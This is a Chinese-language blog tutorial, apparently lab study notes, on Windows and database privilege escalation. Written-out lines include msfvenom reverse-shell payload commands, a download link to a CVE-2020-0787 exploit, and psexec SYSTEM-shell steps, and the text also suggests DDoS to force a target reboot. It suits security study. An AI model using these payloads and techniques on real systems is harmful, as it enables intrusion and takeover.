<h5 id="后台权限，网站权限，数据库权限，接口权限，系统权限，域控权限等"><a href="#后台权限，网站权限，数据库权限，接口权限，系统权限，域控权限等" class="headerlink" title="后台权限，网站权限，数据库权限，接口权限，系统权限，域控权限等"></a>后台权限，网站权限，数据库权限，接口权限，系统权限，域控权限等</h5><h6 id="后台权限：（获得方式：爆破、注入猜解、弱口令等获取账号密码登入）"><a href="#后台权限：（获得方式：爆破、注入猜解、弱口令等获取账号密码登入）" class="headerlink" title="后台权限：（获得方式：爆破、注入猜解、弱口令等获取账号密码登入）"></a>后台权限：（获得方式：爆破、注入猜解、弱口令等获取账号密码登入）</h6><p>一般网站或者后台只能操作应用界面的内容数据图片信息等，无法操作程序的源代码或者服务器上的资源文件的。（如果后台存在文件操作功能的话也可以操作文件数据）</p>
<h6 id="网站权限：（获得方式：以上三种思路获取）"><a href="#网站权限：（获得方式：以上三种思路获取）" class="headerlink" title="网站权限：（获得方式：以上三种思路获取）"></a>网站权限：（获得方式：以上三种思路获取）</h6><p>查看或者修改程序源代码，可以进行网站或应用的配置文件读取（接口配置信息，数据库配置信息等），还能收集服务器操作系统相关的信息，为后续系统提权做准备</p>
<h6 id="数据库权限："><a href="#数据库权限：" class="headerlink" title="数据库权限："></a>数据库权限：</h6><p>操作数据库的权限，数据库的增删改查等，源码或配置文件泄露，也可能是网站权限（webshell）进行是数据库配置文件读取获得。</p>
<h6 id="接口权限：（邮件、短信，支付，第三方登录等）"><a href="#接口权限：（邮件、短信，支付，第三方登录等）" class="headerlink" title="接口权限：（邮件、短信，支付，第三方登录等）"></a>接口权限：（邮件、短信，支付，第三方登录等）</h6><p>后台或者网站权限的获取途径：后台（修改配置信息功能点），网站权限（查看配置文件获取）。</p>
<h2 id="win溢出漏洞及AT-amp-SC-amp-PS提权"><a href="#win溢出漏洞及AT-amp-SC-amp-PS提权" class="headerlink" title="win溢出漏洞及AT&amp;SC&amp;PS提权"></a>win溢出漏洞及AT&amp;SC&amp;PS提权</h2><p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20221016143650952.png"
                      alt="image-20221016143650952"
                ></p>
<h4 id="windows提权命令"><a href="#windows提权命令" class="headerlink" title="windows提权命令"></a>windows提权命令</h4><p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20221016144604042.png"
                      alt="image-20221016144604042"
                ></p>
<h6 id="用户及用户组的权限也需要了解"><a href="#用户及用户组的权限也需要了解" class="headerlink" title="用户及用户组的权限也需要了解"></a>用户及用户组的权限也需要了解</h6><p>默认情况下，系统位用户分配了7个组，并给每个组赋予了不同的操作权限，管理员组、高权限用户组、普通用户组、备份操作组、文件复制组、来宾用户组、身份验证用户组</p>
<p>其中备份操作组和文件复制组为维护系统而设置，平时不会用到</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20221016145158480.png"
                      alt="image-20221016145158480"
                ></p>
<h5 id="提权实例之溢出漏洞提权—基于web环境的权限提升"><a href="#提权实例之溢出漏洞提权—基于web环境的权限提升" class="headerlink" title="提权实例之溢出漏洞提权—基于web环境的权限提升"></a>提权实例之溢出漏洞提权—基于web环境的权限提升</h5><p>如何判断使用哪种溢出漏洞？漏洞该在哪里找？</p>
<p>信息收集—补丁筛选—利用MSF或特定EXP–执行—权限到手</p>
<h5 id="payload生成"><a href="#payload生成" class="headerlink" title="payload生成"></a>payload生成</h5><h6 id="windows"><a href="#windows" class="headerlink" title="windows"></a>windows</h6><p>msfvenom -p windows&#x2F;meterpreter&#x2F;reverse_tcp LHOST&#x3D;<Your IP Address> LPORT&#x3D;<Your Port to Connect On> -f exe &gt; shell.exe</p>
<h6 id="Linux"><a href="#Linux" class="headerlink" title="Linux"></a>Linux</h6><p>msfvenom -p linux&#x2F;x86&#x2F;meterpreter&#x2F;reverse_tcp LHOST&#x3D;<Your IP Address> LPORT&#x3D;<Your Port to Connect On> -f elf &gt; shell.elf</p>
<h6 id="MAC"><a href="#MAC" class="headerlink" title="MAC"></a>MAC</h6><p>msfvenom -p osx&#x2F;x86&#x2F;shell_reverse_tcp LHOST&#x3D;<Your IP Address>LPORT&#x3D;<Your Port to Connect On> -f macho &gt; shell.macho</p>
<p>先使用msf生成一个5577.exe的payload文件，当被攻击主机访问该文件时，将会被链接</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20221017121848451.png"
                      alt="image-20221017121848451"
                ></p>
<p>服务器使用msf的set lport 5577  来监听5577端口 </p>
<p>设置一个监听端口和你的主机IP地址以及payload</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20221018174814902.png"
                      alt="image-20221018174814902"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20221018174847309.png"
                      alt="image-20221018174847309"
                ></p>
<p>run执行，反弹成功</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20221018174912291.png"
                      alt="image-20221018174912291"
                ></p>
<p>可以看到，被攻击主机信息可以有效反弹到服务器，但是getuid发现现在是普通用户权限（web权限），接下来就要进行提权操作</p>
<p>使用search ms16命令，查找出现有的exp</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20221017122327951.png"
                      alt="image-20221017122327951"
                ></p>
<p>使用exp</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20221017142136381.png"
                      alt="image-20221017142136381"
                ></p>
<p>寻找出刚才会话的session发现为3</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20221017122610291.png"
                      alt="image-20221017122610291"
                ></p>
<p>设置session为3，然后设置payload，再查看设置选项（show options）<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20221017122738843.png"
                      alt="image-20221017122738843"
                ></p>
<p>得到结果，查看端口</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20221017122903172.png"
                      alt="image-20221017122903172"
                ></p>
<p>设置IP地址（服务器端的IP地址）</p>
<p> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20221017123006035.png"
                      alt="image-20221017123006035"
                ></p>
<p>设置一个新的端口来接收，system权限</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20221017123037807.png"
                      alt="image-20221017123037807"
                ></p>
<p>执行exploit，发现成功建立第四个会话</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20221017123354205.png"
                      alt="image-20221017123354205"
                ></p>
<p>执行getuid</p>
<p>发现成功获得system权限，最高权限,提权结束</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20221017123320100.png"
                      alt="image-20221017123320100"
                ></p>
<p>（注意：如果你所使用的服务器有安全组功能的话，必须到服务器安全组管理界面，设置端口及IP地址的白名单，不然监听的端口信息反弹不到服务器）</p>
<h5 id="基于本地环境的权限提升–系统溢出漏洞"><a href="#基于本地环境的权限提升–系统溢出漏洞" class="headerlink" title="基于本地环境的权限提升–系统溢出漏洞"></a>基于本地环境的权限提升–系统溢出漏洞</h5><p>exp链接</p>
<div class="highlight-container" data-rel="Text"><figure class="iseeu highlight text"><table><tr><td class="code"><pre><span class="line">https://github.com/cbwang505/CVE-2020-0787-EXP-ALL-WINDOWS-VERSION/releases/download/1/BitsArbitraryFileMoveExploit.exe</span><br></pre></td></tr></table></figure></div>

<p>将生成&#x2F;下载的EXP程序复制到受漏洞影响的版本的测试靶机上，打开cmd，直接拖动exp到cmd窗口中运行exp，如下图所示：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/v2-2f435ace5a53dc2527c8b785f2762317_720w.webp"
                      alt="img"
                ></p>
<p>可以看到exp运行完成后立即弹出一个新的system权限的cmd窗口，如下图所示：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://pic3.zhimg.com/80/v2-cd88f291e18f8b34c86408e40605b54a_720w.webp"
                      alt="img"
                ></p>
<p>此时就通过该漏洞获取了一个本地系统权限的cmd，可以以system权限执行任意操作。</p>
<h5 id="基于本地环境下的权限提升–AT-amp-SC-amp-PS命令"><a href="#基于本地环境下的权限提升–AT-amp-SC-amp-PS命令" class="headerlink" title="基于本地环境下的权限提升–AT&amp;SC&amp;PS命令"></a>基于本地环境下的权限提升–AT&amp;SC&amp;PS命令</h5><h6 id="AT命令"><a href="#AT命令" class="headerlink" title="AT命令"></a>AT命令</h6><p>主要是针对win2008之前的系统</p>
<p>主要原理是在cmd.exe窗口中使用at命令系统是调用system权限执行的，尽管你只是有管理员权限</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20221017132716124.png"
                      alt="image-20221017132716124"
                ></p>
<p>表示预定一个程序在13：24分之后执行cmd.exe</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20221017132731974.png"
                      alt="image-20221017132731974"
                ></p>
<p>在指定时间，打开了cmd.exe表名漏洞成立</p>
<h6 id="SC命令"><a href="#SC命令" class="headerlink" title="SC命令"></a>SC命令</h6><p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20221017133007487.png"
                      alt="image-20221017133007487"
                ></p>
<p>表名先创建一个服务名叫syscmd，还有个变量名叫binPath这个变量绑定一个执行cmd的命令</p>
<p>相当于在你的电脑创建一个服务叫做syscmd</p>
<p>然后直接运行这个服务 sc  start  syscmd即可打开cmd</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20221017133335639.png"
                      alt="image-20221017133335639"
                ></p>
<h6 id="PS命令"><a href="#PS命令" class="headerlink" title="PS命令"></a>PS命令</h6><p>下载pstool工具</p>
<p>然后打开cmd执行psexec.exe -accepteula -s -i -d cmd.exe  表示打开cmd</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20221017133804981.png"
                      alt="image-20221017133804981"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20221017133817690.png"
                      alt="image-20221017133817690"
                ></p>
<p>在打开的cmd中输入whoami，查看可知已获得system权限</p>
<h2 id="MY-amp-MS-amp-ORA等SQL数据库提权"><a href="#MY-amp-MS-amp-ORA等SQL数据库提权" class="headerlink" title="MY&amp;MS&amp;ORA等SQL数据库提权"></a>MY&amp;MS&amp;ORA等SQL数据库提权</h2><p>利用系统溢出漏洞无果的情况下，可以采用数据库提权，但是需要知道数据库提权的前提条件：</p>
<p>​        服务器开启数据库服务及获取到最高权限用户密码 。</p>
<p>​        除了Access数据库外，其他数据库基本都存在数据库提权的可能</p>
<p>在本地或者web环境下都可以进行数据库提权，需要通过端口扫描等，来发现该环境是否具有数据库服务，在这之后需要进行信息收集获得数据库账号密码。</p>
<h3 id="mysql提权"><a href="#mysql提权" class="headerlink" title="mysql提权"></a>mysql提权</h3><p>提权步骤：服务探针—信息收集—提权利用—获得权限</p>
<h6 id="服务探针"><a href="#服务探针" class="headerlink" title="服务探针"></a>服务探针</h6><p>查看是否具有数据库信息，可以利用端口扫描</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20221017220412136.png"
                      alt="image-20221017220412136"
                ></p>
<p>发现3306端口开放，说明具有MySQL数据库，MySQL数据库的密码存储在date&#x2F;mysql&#x2F;user.MYD文件中的</p>
<h6 id="信息收集（得到密码）"><a href="#信息收集（得到密码）" class="headerlink" title="信息收集（得到密码）"></a>信息收集（得到密码）</h6><p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20221017220602189.png"
                      alt="image-20221017220602189"
                ></p>
<p>脚本爆破和工具爆破的区别：</p>
<p>脚本—本地连接本地（需要上传至目标服务器）</p>
<p>工具—你电脑连接目标服务器</p>
<h6 id="提权利用"><a href="#提权利用" class="headerlink" title="提权利用"></a>提权利用</h6><p>先判断MySQL数据库版本 select version();</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20221017222136312.png"
                      alt="image-20221017222136312"
                ></p>
<p>然后再利用已有的webshell进行执行即可</p>
<p>2.MOF提权原理：mof是Windows系统的一个文件，叫做“托管对象格式”，作用是每隔五秒就会去监控进程创建和死亡。就是用MySQL的root权限，然后使用root权限去执行我们上传的mof（要先把原有的mof进行编辑替换）。隔一定时间后这个mof就会被执行，这个mof当中有一段是vbs脚本，这个vbs大多数是cmd的添加管理员用户的命令</p>
<h6 id="提权过程："><a href="#提权过程：" class="headerlink" title="提权过程："></a>提权过程：</h6><p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20221018141950023.png"
                      alt="image-20221018141950023"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20221018142017899.png"
                      alt="image-20221018142017899"
                ></p>
<p>（一般成功的概率较低，被动提权）</p>
<ol start="3">
<li><p>启动项提权（基于操作系统的自启动功能）</p>
<p>到处一个自定义的可执行文件到启动目录配合重启执行</p>
</li>
</ol>
<p>步骤：</p>
<p>如果数据库没有开启外联，需要通过webshell开启外联</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20221018143352551.png"
                      alt="image-20221018143352551"
                ></p>
<p>开启外联后</p>
<p>使用msf进行提权</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20221018143511965.png"
                      alt="image-20221018143511965"
                ></p>
<p>search mysql 搜索MySQL的exp，并使用use命令进行选择使用</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20221018143628365.png"
                      alt="image-20221018143628365"
                ></p>
<p>设置目标主机的IP地址、用户名、密码</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20221018143802006.png"
                      alt="image-20221018143802006"
                ></p>
<p>用exploit进行执行，启动项创建成功</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20221018143900873.png"
                      alt="image-20221018143900873"
                ></p>
<p>接下来就是想办法让人家主机重启 ，最常用的就是ddos攻击导致资源枯竭致使服务器自动重启</p>
<h3 id="SQLSever数据库提权"><a href="#SQLSever数据库提权" class="headerlink" title="SQLSever数据库提权"></a>SQLSever数据库提权</h3><p>流程：服务探针—信息收集—提权利用—获得权限</p>
<p>直接获取,被阻止需要开启</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20221018154438279.png"
                      alt="image-20221018154438279"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20221018154122467.png"
                      alt="image-20221018154122467"
                ></p>
<p>开启后，获得system权限</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20221018154647705.png"
                      alt="image-20221018154647705"
                ></p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20221018154146481.png"
                      alt="image-20221018154146481" style="zoom:150%;" 
                >

<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20221018154808146.png"
                      alt="image-20221018154808146" style="zoom:150%;" 
                >

<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20221018155228658.png"
                      alt="image-20221018155228658" style="zoom:150%;" 
                >

<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20221018155731871.png"
                      alt="image-20221018155731871" style="zoom:150%;" 
                >



<h3 id="Oracle数据库提权"><a href="#Oracle数据库提权" class="headerlink" title="Oracle数据库提权"></a>Oracle数据库提权</h3><h6 id="普通用户模式"><a href="#普通用户模式" class="headerlink" title="普通用户模式"></a>普通用户模式</h6><p>前提是拥有一个普通的oracle连接账号，不需要DBA权限，可以提权至DBS，并以oracle实例运行的权限执行操作系统命令。</p>
<h6 id="DBA用户模式（自动化工具演示）"><a href="#DBA用户模式（自动化工具演示）" class="headerlink" title="DBA用户模式（自动化工具演示）"></a>DBA用户模式（自动化工具演示）</h6><p>拥有DBA账号密码，可以省去自己手动去创建存储过程的繁琐步骤，一键执行测试。</p>
<h6 id="注入提升模式（sqlmap演示测试）"><a href="#注入提升模式（sqlmap演示测试）" class="headerlink" title="注入提升模式（sqlmap演示测试）"></a>注入提升模式（sqlmap演示测试）</h6><p>拥有一个oracle注入点，可以通过注入点直接执行系统命令，此种模式没有实现回显，需要自己验证</p>
<h2 id="Redis-amp-Postgre-amp-令牌窃取-amp-进程注入"><a href="#Redis-amp-Postgre-amp-令牌窃取-amp-进程注入" class="headerlink" title="Redis&amp;Postgre&amp;令牌窃取&amp;进程注入"></a>Redis&amp;Postgre&amp;令牌窃取&amp;进程注入</h2><p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20221019133531100.png"
                      alt="image-20221019133531100"
                ></p>
<h3 id="Redis数据库权限提升"><a href="#Redis数据库权限提升" class="headerlink" title="Redis数据库权限提升"></a>Redis数据库权限提升</h3><p>起因：由于Redis服务配置不当，可被攻击者恶意利用。黑客借助Redis内置命令，可将现有数据恶意清空；如果Redis以root身份运行，黑客可以往服务器上写入SSH公钥文件，直接登入服务器。</p>
<p>连接（利用未授权或者有密码）-利用如下方法提权</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20221019133947495.png"
                      alt="image-20221019133947495"
                ></p>
<p><a class="link"   href="https://blog.csdn.net/fly_hps/article/details/80937837" >https://blog.csdn.net/fly_hps/article/details/80937837 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20221019135019394.png"
                      alt="image-20221019135019394"
                ></p>
<h3 id="postgresql数据库提权"><a href="#postgresql数据库提权" class="headerlink" title="postgresql数据库提权"></a>postgresql数据库提权</h3><p>postgresql数据库是一种关系型数据库。其中9.3到11版本中存在一处特性，管理员或者具有“COPY TO&#x2F;FROM PROGRAM”的用户，可以使用这个特性执行任意命令</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20221019135525686.png"
                      alt="image-20221019135525686"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20221019135507395.png"
                      alt="image-20221019135507395"
                ></p>
<h3 id="Windows2008-amp-7令牌窃取提升-本地"><a href="#Windows2008-amp-7令牌窃取提升-本地" class="headerlink" title="Windows2008&amp;7令牌窃取提升-本地"></a>Windows2008&amp;7令牌窃取提升-本地</h3><p>进行全程过程调用时请求提升权限，然后调用它从而生成特权安全令牌以执行特权操作。当系统允许令牌不仅用于进程本身，还用于原始请求进程时，漏洞就会出现。</p>
<p>流程：获取会话—利用模块—窃取令牌—提权</p>
<p>得先利用msf反弹信息</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20221019140951226.png"
                      alt="image-20221019140951226"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20221019141011052.png"
                      alt="image-20221019141011052"
                ></p>
<h3 id="Windows2003-amp-10注入提升"><a href="#Windows2003-amp-10注入提升" class="headerlink" title="Windows2003&amp;10注入提升"></a>Windows2003&amp;10注入提升</h3><p>进程注入提权是本地提权方式的一种较为老的安全技术了，利用的是注入进程的所有者实现权限共享机制，这类技术主要利用再windows2008之前的操作系统（不包括），所以我们需要学习后续的本地提权更多的手法才能有针对高版本的系统.</p>
<h5 id="win2008之前的系统提权："><a href="#win2008之前的系统提权：" class="headerlink" title="win2008之前的系统提权："></a>win2008之前的系统提权：</h5><p>利用工具</p>
<h5 id="之后："><a href="#之后：" class="headerlink" title="之后："></a>之后：</h5><p>pexec64 工具</p>
<h2 id="烂土豆-amp-dll劫持-amp-引导路径-amp-服务权限—提权"><a href="#烂土豆-amp-dll劫持-amp-引导路径-amp-服务权限—提权" class="headerlink" title="烂土豆&amp;dll劫持&amp;引导路径&amp;服务权限—提权"></a>烂土豆&amp;dll劫持&amp;引导路径&amp;服务权限—提权</h2><h4 id="烂土豆提权"><a href="#烂土豆提权" class="headerlink" title="烂土豆提权"></a>烂土豆提权</h4><p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20221020164246540.png"
                      alt="image-20221020164246540"
                ></p>
<h6 id="烂土豆比热土豆的优点："><a href="#烂土豆比热土豆的优点：" class="headerlink" title="烂土豆比热土豆的优点："></a>烂土豆比热土豆的优点：</h6><p>1.100%可靠</p>
<p>2.全版本通杀</p>
<p>3.立即生效，热土豆需要等待windows更新</p>
<h5 id="烂土豆配合令牌窃取提权-web权限"><a href="#烂土豆配合令牌窃取提权-web权限" class="headerlink" title="烂土豆配合令牌窃取提权-web权限"></a>烂土豆配合令牌窃取提权-web权限</h5><p>过程：上传烂土豆–执行烂土豆–利用窃取模块–窃取system–成功</p>
<p>步骤：</p>
<ol>
<li><p>先下载potato.exe文件并通过webshell上传到靶机中去</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20221020211128892.png"
                      alt="image-20221020211128892"
                ></p>
</li>
</ol>
<p>2.在msf中先连接到靶机，确保能够反弹shell，然后cd c:\定位到patato.exe的位置</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20221020211348556.png"
                      alt="image-20221020211348556"
                ></p>
<p>3.输入指令，运行patato.exe</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20221020211438585.png"
                      alt="image-20221020211438585"
                ></p>
<p>4.然后执行令牌窃取的三步骤，即可获得系统权限</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20221020212013343.png"
                      alt="image-20221020212013343"
                ></p>
<h4 id="DLL劫持提权"><a href="#DLL劫持提权" class="headerlink" title="DLL劫持提权"></a>DLL劫持提权</h4><p>需要被攻击主机有特定软件应用及启用配合</p>
<p>原理：Windows。程序启动的时候需要DLL。如果这些DLL不存在，则可以通过在应用程序要查找的位置放置恶意DLL来提权。通常，Windows应用程序有其预定义好的搜索DLL的路径给，它会根据下面的顺序进行搜索：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20221021135233606.png"
                      alt="image-20221021135233606"
                ></p>
<p>步骤：信息收集—进程调试—制作DLL并上传—替换DLL-启动应用后成功</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20221021140258406.png"
                      alt="image-20221021140258406"
                ></p>
<p>生成dll文件<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20221021140358055.png"
                      alt="image-20221021140358055"
                >，用来替换一个第三方软件的dll文件</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20221021140440660.png"
                      alt="image-20221021140440660"
                ></p>
<p>上面两个文件是可以替换的，因为这个软件运行的时候会调用这两个文件（用火绒剑查看调用情况），随便替换一个都行。（替换的文件名得改成一样的）</p>
<p>打开文件即可监听到窗口</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20221021142533920.png"
                      alt="image-20221021142533920"
                ></p>
<p>后续就可以利用令牌窃取等进行提权</p>
<h4 id="win2012-不带引号服务路径配合MSF-Web，本地权限"><a href="#win2012-不带引号服务路径配合MSF-Web，本地权限" class="headerlink" title="win2012-不带引号服务路径配合MSF-Web，本地权限"></a>win2012-不带引号服务路径配合MSF-Web，本地权限</h4><p>原理：当windows服务运行时，会发生一下两种情况之一。如果给出了可执行文件，并且引用了完整的路径，则系统会按字面解释它并执行。但是，如果服务的二进制路径未包含在引号中，则操作系统将会执行找到的空格分隔的服务路径的第一个实例。</p>
<p>过程：检测引号服务路径（看看有没有引号）—利用路径制作文件并上传–启用服务或重启—调用后成功</p>
<p>原理就是：在一些服务的执行路径中，有些目录没有带引号，这样会使得执行的目录与原来想要执行的目录不同</p>
<p>举个例子：</p>
<p>C:&#x2F;&#x2F;ni  hao&#x2F;jjj.exe</p>
<p>“C:&#x2F;&#x2F;ni  hao&#x2F;jjj.exe”</p>
<p>第一个执行的是ni，第二个才是执行jjj.exe</p>
<p>如果权限够，webshell启动服务的命令sc start 服务名</p>
<p>服务启动则会调用系统权限</p>
<p>所以先用命令查找靶机中（用webshell），没有带引号“”的路径的服务</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20221021152523741.png"
                      alt="image-20221021152523741" style="zoom:150%;" 
                >

<p>然后查看该服务的路径，并用msf生成一个与服务路径名相同的.exe后门文件，然后通过webshell上传靶机</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20221021152116172.png"
                      alt="image-20221021152116172"
                ></p>
<p>利用服务启动，则会调用该后门文件，msf反弹shell就生效了.</p>
<h4 id="win2012-不安全服务权限配合msf-本地提权"><a href="#win2012-不安全服务权限配合msf-本地提权" class="headerlink" title="win2012-不安全服务权限配合msf-本地提权"></a>win2012-不安全服务权限配合msf-本地提权</h4><p>原理：一般服务中，即使正确的引用服务路径（引号的那个方法就不行了），但也可能存在其他的漏洞&#x2F;由于管理配置错误，用户可能对服务拥有过多的权限，比如，可以直接修改它导致重定向执行文件。</p>
<p>步骤：检测服务权限配置–制作文件并上传–更改服务路径指向-调用后成功</p>
<p>下载文件：<a class="link"   href="https://learn.microsoft.com/en-us/sysinternals/downloads/accesschk" >https://learn.microsoft.com/en-us/sysinternals/downloads/accesschk <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p>第一条命令利用下载的软件寻找具有administrators权限的服务</p>
<p>第二条命令是改变服务路径，将其引导至msf生成的exe后门文件</p>
<p>第三条命令是执行该服务</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20221021154236469.png"
                      alt="image-20221021154236469" style="zoom:150%;" 
                >

<p>这时peogram.exe文件就被执行了，msf就反弹成功</p>
<h4 id="windows提权总结"><a href="#windows提权总结" class="headerlink" title="windows提权总结"></a>windows提权总结</h4><p>掌握：提权方法对应的层面（远程还是本地）、提权方法对应系统版本、相关文件及后门免杀问题等</p>
<h2 id="linux提权"><a href="#linux提权" class="headerlink" title="linux提权"></a>linux提权</h2><p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20221022190138371.png"
                      alt="image-20221022190138371"
                ></p>
<h3 id="linux脏牛内核漏洞"><a href="#linux脏牛内核漏洞" class="headerlink" title="linux脏牛内核漏洞"></a>linux脏牛内核漏洞</h3><h4 id="linux提权自动化脚本利用–4个脚本"><a href="#linux提权自动化脚本利用–4个脚本" class="headerlink" title="linux提权自动化脚本利用–4个脚本"></a>linux提权自动化脚本利用–4个脚本</h4><p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20221022190542244.png"
                      alt="image-20221022190542244"
                ></p>
